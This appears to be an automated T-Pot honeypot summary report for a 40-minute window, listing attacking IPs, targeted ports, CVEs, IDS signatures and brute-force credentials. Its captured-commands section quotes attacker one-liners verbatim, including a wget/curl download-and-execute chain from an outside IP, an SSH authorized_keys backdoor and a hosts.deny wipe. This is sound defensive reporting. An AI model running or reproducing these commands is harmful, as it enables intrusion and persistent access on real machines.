Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-16T05:01:26Z
**Timeframe:** 2025-10-16T04:20:01Z to 2025-10-16T05:00:01Z

**Files Used:**
* agg_log_20251016T042001Z.json
* agg_log_20251016T044001Z.json
* agg_log_20251016T050001Z.json

### Executive Summary

This report summarizes 19,157 events collected from the T-Pot honeypot network over a 40-minute period. The majority of attacks were reconnaissance and brute-force attempts, with a significant number of events logged by the Cowrie, Honeytrap, and Sentrypeer honeypots. The most targeted services were SIP (5060), SMB (445), and SSH (22). Several CVEs were detected, with CVE-2002-0013 and CVE-2002-0012 being the most frequent.

### Detailed Analysis

**Attacks by Honeypot:**
* Cowrie: 5739
* Honeytrap: 3546
* Sentrypeer: 3128
* Suricata: 2887
* Dionaea: 1123
* Ciscoasa: 1105
* Mailoney: 856
* Tanner: 47
* ConPot: 74
* Adbhoney: 24
* H0neytr4p: 18
* Honeyaml: 9
* Dicompot: 2
* Ipphoney: 3
* Redishoneypot: 3
* ElasticPot: 1

**Top Attacking IPs:**
* 113.161.146.64: 1360
* 86.54.42.238: 822
* 45.130.190.34: 1017
* 23.94.26.58: 849
* 172.86.95.115: 529
* 172.86.95.98: 519
* 185.243.5.158: 458
* 42.200.78.78: 447
* 61.219.181.31: 344
* 66.116.199.234: 376
* 103.174.115.72: 427
* 203.194.106.66: 267
* 200.69.236.207: 238
* 185.158.22.150: 197
* 36.66.16.233: 259
* 103.154.216.188: 376
* 210.91.73.167: 377
* 40.117.97.0: 222
* 62.141.43.183: 214
* 107.170.36.5: 168

**Top Targeted Ports/Protocols:**
* 5060: 3128
* 445: 1049
* TCP/445: 1360
* 22: 711
* 5903: 226
* 8333: 131
* 5901: 114
* 25: 843
* 80: 22
* 1025: 51
* 5904: 76
* 5905: 77
* 3388: 43
* 23: 38
* 2181: 38
* 1433: 21
* TCP/1433: 23
* 3306: 22
* 5909: 49
* 5908: 49
* 5907: 50
* 5902: 16
* 15672: 34
* 27018: 35

**Most Common CVEs:**
* CVE-2002-0013 CVE-2002-0012: 20
* CVE-2002-0013 CVE-2002-0012 CVE-1999-0517: 8
* CVE-2019-11500 CVE-2019-11500: 6
* CVE-2021-3449 CVE-2021-3449: 3
* CVE-2019-12263 CVE-2019-12261 CVE-2019-12260 CVE-2019-12255: 2
* CVE-2016-20016 CVE-2016-20016: 1

**Commands Attempted by Attackers:**
* `cd ~; chattr -ia .ssh; lockr -ia .ssh`: 37
* `lockr -ia .ssh`: 37
* `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`: 37
* `cat /proc/cpuinfo | grep name | wc -l`: 37
* `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`: 37
* `uname -a`: 37
* `whoami`: 37
* `Enter new UNIX password: `: 26
* `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`: 5
* `cd /data/local/tmp/; busybox wget http://72.60.107.93/w.sh; sh w.sh; curl http://72.60.107.93/c.sh; sh c.sh; wget http://72.60.107.93/wget.sh; sh wget.sh; curl http://72.60.107.93/wget.sh; sh wget.sh; busybox wget http://72.60.107.93/wget.sh; sh wget.sh; busybox curl http://72.60.107.93/wget.sh; sh wget.sh`: 1

**Signatures Triggered:**
* ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1358
* ET DROP Dshield Block Listed Source group 1: 487
* ET SCAN NMAP -sS window 1024: 164
* ET SCAN MS Terminal Server Traffic on Non-standard Port: 50
* ET SCAN Suspicious inbound to MSSQL port 1433: 23
* ET INFO Reserved Internal IP Traffic: 55
* ET SCAN Sipsak SIP scan: 29
* ET SCAN Potential SSH Scan: 22
* ET INFO CURL User Agent: 10
* GPL SNMP request udp: 8
* ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 8
* ET CINS Active Threat Intelligence Poor Reputation IP group 50: 13
* ET CINS Active Threat Intelligence Poor Reputation IP group 47: 20
* ET CINS Active Threat Intelligence Poor Reputation IP group 49: 12
* ET CINS Active Threat Intelligence Poor Reputation IP group 44: 20
* ET CINS Active Threat Intelligence Poor Reputation IP group 46: 9
* ET CINS Active Threat Intelligence Poor Reputation IP group 43: 11
* ET CINS Active Threat Intelligence Poor Reputation IP group 51: 17
* ET CINS Active Threat Intelligence Poor Reputation IP group 13: 8

**Users / Login Attempts:**
* 345gs5662d34/345gs5662d34: 37
* root/: 21
* root/QWE123!@#qwe: 18
* root/123@@@: 14
* root/Qaz123qaz: 11
* ftpuser/ftppassword: 11
* root/3245gs5662d34: 11
* centos/centos666: 7
* operator/operator2001: 6
* support/support2003: 6
* centos/centos555: 4
* root/passw0rd: 4
* root/admin098234: 4
* admin/uploader: 4
* root/admin1: 4
* root/Admin1205-: 4
* unknown/p@ssword: 4
* root/admin1234!: 4
* ubnt/987654321: 4
* user/user000: 6
* blank/5555555: 4
* root/pass1213: 4
* blank/9: 4
* centos/centos444: 4

**Files Uploaded/Downloaded:**
* wget.sh;: 4
* 11: 1
* fonts.gstatic.com: 1
* css?family=Libre+Franklin%3A300%2C300i%2C400%2C400i%2C600%2C600i%2C800%2C800i&amp;subset=latin%2Clatin-ext: 1
* ie8.css?ver=1.0: 1
* html5.js?ver=3.7.3: 1
* w.sh;: 1
* c.sh;: 1
* json: 1

**HTTP User-Agents:**
* *No user agents recorded in this timeframe.*

**SSH Clients:**
* *No SSH clients recorded in this timeframe.*

**SSH Servers:**
* *No SSH servers recorded in this timeframe.*

**Top Attacker AS Organizations:**
* *No AS organizations recorded in this timeframe.*

### Key Observations and Anomalies

* A large number of attacks originated from the IP address `113.161.146.64`, primarily targeting TCP port 445 (SMB) and triggering the "DoublePulsar Backdoor" signature. This suggests a targeted campaign to exploit the EternalBlue vulnerability.
* The command `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..."` was frequently used, indicating attempts to install a persistent SSH key for backdoor access.
* The file `wget.sh` was downloaded multiple times, suggesting the use of shell scripts to automate further stages of the attack.
* There is a high volume of scanning activity for common vulnerabilities and open ports, which is typical for automated attack tools.
* The lack of HTTP user agents, SSH client/server information, and AS organization data might indicate that the attacks were primarily at the network and transport layers, or that the honeypots used did not capture this information.

This concludes the Honeypot Attack Summary Report. Further analysis of the captured commands and files is recommended to understand the full scope of the attackers' intentions.
